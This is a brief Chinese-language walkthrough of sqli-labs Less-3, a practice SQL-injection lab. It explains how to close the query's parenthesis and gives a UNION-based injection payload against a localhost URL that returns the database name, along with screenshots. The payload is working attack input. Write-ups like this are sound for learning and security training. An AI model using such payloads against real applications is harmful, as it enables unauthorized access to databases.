less3报错提示有括号（）需要闭合

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/199E74A6B00D4AFDB9475CB58CECE05Aclipboard.png)

构造payload:

http://127.0.0.1/sql-labs/Less-3/?id=-1') union select 1,database(),3--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/15C43AD66F3946C4945D05BD6F63204Cclipboard.png)



源代码：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/14CA309A6D1146C69906A0B412DB17C3clipboard.png)

